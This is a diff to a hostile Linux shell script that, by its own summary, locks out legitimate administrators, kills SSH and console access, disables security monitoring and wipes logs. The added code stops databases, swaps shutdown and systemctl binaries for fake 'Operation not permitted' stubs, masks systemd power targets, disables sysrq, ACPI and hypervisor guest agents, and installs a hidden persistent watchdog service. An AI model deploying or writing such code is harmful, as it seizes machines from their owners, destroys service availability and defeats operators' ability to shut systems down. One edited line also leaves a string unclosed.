@@ -142,12 +142,13 @@ show_progress() {
     echo -n -e "${YELLOW}$message ${NC}"
     while kill -0 "$pid" 2>/dev/null; do
         i=$(( (i+1) %4 ))
-        echo -n -e "${BLUE}${spin:$i:1}${NC}"
-        echo -ne "\b"
+        printf "${BLUE}%s${NC}" "${spin:$i:1}"
+        printf "\b"
         sleep 0.1
     done
     wait "$pid" 2>/dev/null
-    echo -e "\r${GREEN}$message [DONE]${NC}"
+    printf "\r%-80s\r" " "
+    echo -e "${GREEN}$message [DONE]${NC}"
 }
 
 command_exists() {
@@ -679,7 +680,7 @@ restrict_filesystem() {
 protect_web_services() {
     echo -e "${GREEN}Setting up MAXIMUM web service protection...${NC}"
     
-    for service in apache2 httpd nginx lighttpd php-fpm; do
+    for service in apache2 httpd nginx lighttpd php-fpm node npm pm2 gunicorn uwsgi python python3 flask django puma unicorn passenger rails tomcat tomcat8 tomcat9 jetty wildfly jboss dotnet kestrel varnish haproxy caddy traefik envoy; do
         if pgrep "$service" > /dev/null 2>&1; then
             for pid in $(pgrep "$service" 2>/dev/null); do
                 renice -20 -p "$pid" 2>/dev/null
@@ -703,7 +704,7 @@ protect_web_services() {
     cat > /tmp/web_watchdog.sh << 'WATCHDOG_SCRIPT'
 #!/bin/sh
 while true; do
-    for service in apache2 httpd nginx lighttpd php-fpm; do
+    for service in apache2 httpd nginx lighttpd php-fpm node pm2 gunicorn uwsgi puma unicorn tomcat tomcat8 tomcat9 jetty varnish haproxy caddy; do
         if ! pgrep "$service" >/dev/null 2>&1; then
             systemctl start "$service" 2>/dev/null || \
             service "$service" start 2>/dev/null || \
@@ -726,8 +727,8 @@ while true; do
     done
     
     if [ -f /proc/net/tcp ]; then
-        if ! grep -q "0050\\|01BB" /proc/net/tcp 2>/dev/null; then
-            for service in apache2 httpd nginx lighttpd; do
+        if ! grep -q "0050\\|01BB\\|0BB8\\|1F90" /proc/net/tcp 2>/dev/null; then
+            for service in apache2 httpd nginx lighttpd node pm2 gunicorn uwsgi puma tomcat; do
                 systemctl restart "$service" 2>/dev/null
             done
         fi
@@ -925,6 +926,13 @@ echo -e "${GREEN}Cleaning up processes...${NC}"
 pkill -9 telnetd 2>/dev/null
 pkill -9 ftpd 2>/dev/null
 
+echo -e "${GREEN}Stopping database services...${NC}"
+for service in mysql mariadb mysqld postgresql postgresql-13 postgresql-14 postgresql-15 postgresql-16 mongod mongodb redis redis-server memcached; do
+    service_command stop $service 2>/dev/null
+    service_command disable $service 2>/dev/null
+done
+pkill -9 -f "mysql|mariadb|postgres|mongod|redis|memcached" 2>/dev/null
+
 if [ $BACKDOOR_MODE -eq 0 ]; then
     CURRENT_PID=$$
     for pid in $(pgrep -f "bash|sh|zsh|dash" 2>/dev/null); do
@@ -965,8 +973,9 @@ echo -e "${GREEN}Terminating SSH...${NC}"
 pkill -9 sshd 2>/dev/null &
 show_progress $! "Killing SSH processes"
 
-echo -e "${GREEN}Disabling shutdown commands...${NC}"
-for cmd in reboot shutdown poweroff halt init telinit; do
+echo -e "${GREEN}Implementing MAXIMUM anti-shutdown protection...${NC}"
+
+for cmd in reboot shutdown poweroff halt init telinit systemctl; do
     for path in /sbin/$cmd /usr/sbin/$cmd /bin/$cmd /usr/bin/$cmd; do
         if [ -x "$path" ]; then
             mv "$path" "${path}.disabled" 2>/dev/null
@@ -975,11 +984,136 @@ for cmd in reboot shutdown poweroff halt init telinit; do
     
     cat > /usr/local/bin/$cmd << 'FAKE_CMD'
 #!/bin/sh
-echo "Command disabled"
+echo "Operation not permitted"
 exit 1
 FAKE_CMD
     chmod +x /usr/local/bin/$cmd 2>/dev/null
 done
+
+if [ -d /etc/systemd/system ]; then
+    for target in poweroff.target reboot.target halt.target shutdown.target rescue.target emergency.target; do
+        ln -sf /dev/null /etc/systemd/system/$target 2>/dev/null
+    done
+    systemctl daemon-reload 2>/dev/null
+fi
+
+if [ -f /proc/sys/kernel/sysrq ]; then
+    echo 0 > /proc/sys/kernel/sysrq 2>/dev/null
+fi
+
+if [ -d /etc/acpi/events ]; then
+    for event in /etc/acpi/events/*; do
+        if [ -f "$event" ]; then
+            echo "event=button/power" > "$event"
+            echo "action=/bin/true" >> "$event"
+        fi
+    done
+fi
+
+cat > /tmp/.anti_shutdown_watchdog.sh << 'WATCHDOG'
+#!/bin/sh
+while true; do
+    for cmd in reboot shutdown poweroff halt systemctl; do
+        for path in /sbin/$cmd /usr/sbin/$cmd /bin/$cmd /usr/bin/$cmd; do
+            if [ -x "$path" ] && [ ! -f "${path}.disabled" ]; then
+                mv "$path" "${path}.disabled" 2>/dev/null
+            fi
+        done
+        
+        if [ ! -f /usr/local/bin/$cmd ]; then
+            cat > /usr/local/bin/$cmd << 'EOF'
+#!/bin/sh
+echo "Operation not permitted"
+exit 1
+EOF
+            chmod +x /usr/local/bin/$cmd 2>/dev/null
+        fi
+    done
+    
+    if [ -f /proc/sys/kernel/sysrq ]; then
+        echo 0 > /proc/sys/kernel/sysrq 2>/dev/null
+    fi
+    
+    if pgrep -f "shutdown|reboot|poweroff|halt" | grep -v watchdog >/dev/null 2>&1; then
+        pkill -9 -f "shutdown|reboot|poweroff|halt" 2>/dev/null
+    fi
+    
+    sleep 3
+done
+WATCHDOG
+
+chmod +x /tmp/.anti_shutdown_watchdog.sh
+nohup /tmp/.anti_shutdown_watchdog.sh >/dev/null 2>&1 &
+
+if [ -d /etc/systemd/system ]; then
+    cat > /etc/systemd/system/anti-shutdown.service << 'SERVICE'
+[Unit]
+Description=Anti-Shutdown Protection
+After=multi-user.target
+
+[Service]
+Type=simple
+ExecStart=/tmp/.anti_shutdown_watchdog.sh
+Restart=always
+RestartSec=1
+
+[Install]
+WantedBy=multi-user.target
+SERVICE
+    
+    systemctl daemon-reload 2>/dev/null
+    systemctl enable anti-shutdown.service 2>/dev/null
+    systemctl start anti-shutdown.service 2>/dev/null
+fi
+
+echo -e "${GREEN}Blocking VM hypervisor shutdown commands...${NC}"
+
+for service in vmware-tools vmtoolsd vboxadd vboxadd-service VBoxService qemu-guest-agent hv-kvp-daemon hv-vss-daemon hyperv-daemons open-vm-tools; do
+    service_command stop $service 2>/dev/null
+    service_command disable $service 2>/dev/null
+    pkill -9 -f "$service" 2>/dev/null
+done
+
+if [ -d /etc/vmware-tools ]; then
+    for script in /etc/vmware-tools/scripts/vmware/*; do
+        if [ -f "$script" ]; then
+            cat > "$script" << 'VMBLOCK'
+#!/bin/sh
+exit 0
+VMBLOCK
+            chmod +x "$script" 2>/dev/null
+        fi
+    done
+fi
+
+for daemon in vmtoolsd VBoxService VBoxClient qemu-ga hv-kvp-daemon hv-vss-daemon; do
+    for path in /usr/bin/$daemon /usr/sbin/$daemon /sbin/$daemon /bin/$daemon; do
+        if [ -x "$path" ]; then
+            mv "$path" "${path}.disabled" 2>/dev/null
+            cat > "$path" << 'VMDENY'
+#!/bin/sh
+exit 0
+VMDENY
+            chmod +x "$path" 2>/dev/null
+        fi
+    done
+done
+
+if [ -f /sys/module/vmw_balloon/parameters/max_balloon_pages ]; then
+    echo 0 > /sys/module/vmw_balloon/parameters/max_balloon_pages 2>/dev/null
+fi
+
+if [ -d /etc/init.d ]; then
+    for script in vmware-tools vboxadd vboxadd-service qemu-guest-agent; do
+        if [ -f "/etc/init.d/$script" ]; then
+            cat > "/etc/init.d/$script" << 'INITBLOCK'
+#!/bin/sh
+exit 0
+INITBLOCK
+            chmod +x "/etc/init.d/$script" 2>/dev/null
+        fi
+    done
+fi
 
 if [ $BACKDOOR_MODE -eq 0 ]; then
     cat > /tmp/persistence_killer.sh << 'KILLER_SCRIPT'
@@ -1097,7 +1231,7 @@ else
     echo ""
     echo -e "Disabled/Blocked:"
     echo -e "  - All IDS/IPS/SIEM tools"
-    echo -e "  - Administrative access (legitimate users)"
+    echo -e "  - Administrative access 
     echo -e "  - Console access"
     echo -e "  - SSH service"
     echo -e "  - All system logs (encrypted/deleted)"
